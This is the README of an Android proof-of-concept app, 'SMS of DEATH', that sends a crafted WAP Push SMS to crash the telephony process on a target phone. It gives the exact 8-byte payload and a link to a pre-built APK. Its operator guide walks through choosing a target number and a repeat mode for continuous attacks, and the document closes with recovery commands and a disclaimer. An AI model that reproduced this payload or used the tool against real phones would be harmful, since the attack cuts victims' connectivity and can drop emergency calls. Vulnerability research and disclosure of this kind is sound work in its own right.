<div align="center">

# SMS of DEATH (WAP Push Remote Modem Crash PoC)

[![Android SDK](https://img.shields.io/badge/Android-SDK%2030%E2%80%9335-brightgreen.svg)](https://developer.android.com)
[![Security Research](https://img.shields.io/badge/Security-Research%20PoC-red.svg)](https://smsofdeath.com)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

<img width="500" alt="App Banner" src="https://github.com/user-attachments/assets/1bf927fe-0443-43f5-a529-e32e02bbc92f" />

</div>

---

## Overview

**SMS_of_DEATH** is a specialized proof-of-concept (PoC) security research tool and Android application that demonstrates a zero-click remote modem denial-of-service vulnerability. 

By transmitting a crafted 8-byte WAP Push Protocol Data Unit (PDU) over SMS to target port `2948`, the payload induces an unhandled `NegativeArraySizeException` within `WapPushOverSms.decodeWapPdu`. Because this exception propagates uncaught through `InboundSmsHandler.processMessagePart`, it crashes the system telephony process (`com.android.phone`). This terminates active calls (including emergency calls) and disrupts radio connectivity without any user interaction required on the target device.

> **Full Technical Writeup:** [https://smsofdeath.com/](https://smsofdeath.com/)

---

## Features

- **Lab-RATS v1.6 Dark UI Dashboard**: Cyberpunk telemetry console with Orbitron typography and custom pill-shaped controls.
- **Multi-SIM Transmitter Selection**: Automatically enumerates active subscriptions (`subId` / slot index) for dispatch.
- **Continuous Repeat Stream**: Automated signal looping at configurable 1.2-second intervals.
- **Carrier Delivery Monitor**: Real-time network acknowledgment tracking using broadcast delivery receipts (`SMS_SENT` / `SMS_DELIVERED`).
- **Attack Profile Customizer**: Switch between standard WAP Push Modem Panic (`01 06 88 80 80 80 00 BE`) and custom hex fuzzer payloads.

---

## Payload Anatomy

```hex
01 06 88 80 80 80 00 BE   → Dispatched as a binary data SMS to UDP Port 2948
```

---

## Installation & Quickstart

1. Download the pre-built `SMS_of_DEATH.apk` from the **[Releases Section](../../releases)**.
2. Sideload and install the APK onto your designated testing Android device.

<details>
<summary><b>📸 View Application Interface Screenshot</b></summary>
<br>
<p align="center">
<img src="https://github.com/user-attachments/assets/9932ba05-c794-4c4d-b461-83f56d6321a3" alt="App Screenshot" width="30%">
</p>
</details>

---

## Building from Source

Ensure you have the Android SDK installed, then compile the debug APK via Gradle:

```bash
./gradlew assembleDebug
```

If prompted for the SDK path, create a `local.properties` file in the root directory:

```properties
sdk.dir=/path/to/Your/Android/SDK
```

The compiled binary will be generated at:
`app/build/outputs/apk/debug/app-debug.apk`

---

## Operator Usage Guide

1. Install and launch **SMS_of_DEATH** on the sender device.
2. Enter the **Target MSISDN** (or select from active subscriptions).
3. Select the sending **Transmitter SIM / Sub ID**.
4. Choose your **Attack Profile** (Port 2948 Panic or Custom Hex).
5. Tap **EXECUTE** for a single packet dispatch or **REPEAT** for a continuous attack stream (vibrates on send).

### Target Verification via Logcat:
```bash
adb logcat | grep -E 'NegativeArraySize|WapPushOverSms|com.android.phone'
```
* **Expected Result**: `FATAL EXCEPTION` within ~1–2 seconds, process PID rotation for `com.android.phone`, and temporary signal loss.

### System Requirements:
- **`minSdk`**: 30 (Android 11)
- **`targetSdk` / `compileSdk`**: 35 (Android 15+)
- **Permissions**: `SEND_SMS`, `READ_PHONE_NUMBERS`, `READ_PHONE_STATE`, `VIBRATE`, `READ_LOGS`

---

## Remediation & Recovery Guide

If a test device enters a persistent boot/crash loop due to unprocessed raw WAP Push entries, execute the following remediation steps over ADB during the post-boot stabilization window *(when `adb shell getprop sys.boot_completed` returns `1`)*:

### 1. Identify Malformed Raw Entries (`destination_port = 134020`)
```bash
adb shell content query --uri content://sms/raw --projection _id:destination_port:date:deleted
```

### 2. Grant Shell Permissions for SMS Storage Modification
```bash
adb shell cmd appops set com.android.shell WRITE_SMS allow
```

### 3. Purge Malformed Row Entries *(Replace `<SENDER_ADDRESS>` with the address from Step 1)*
```bash
adb shell "content delete --uri content://sms/raw --where \"address='<SENDER_ADDRESS>'\""
```

### 4. Revoke Shell SMS Privileges
```bash
adb shell cmd appops set com.android.shell WRITE_SMS default
```

> **Note:** No factory reset or recovery wipe is required. 

### Emergency Last Resort (Clears all SMS/MMS and APN databases):
```bash
adb shell pm clear com.android.providers.telephony
```

### Expected Secure Vendor Behavior:
WAP Push PDUs containing invalid lengths or malformed headers must be safely discarded and purged from the raw message queue rather than inducing an uncaught runtime exception that destabilizes the baseband telephony stack.

---

## Disclaimer

This software is provided strictly for **authorized security research**, educational purposes, and vulnerability testing on devices you own or have explicit, written authorization to test. **Do not use** against production systems, third-party networks, or individuals without prior explicit consent. The author assumes no liability for misuse.
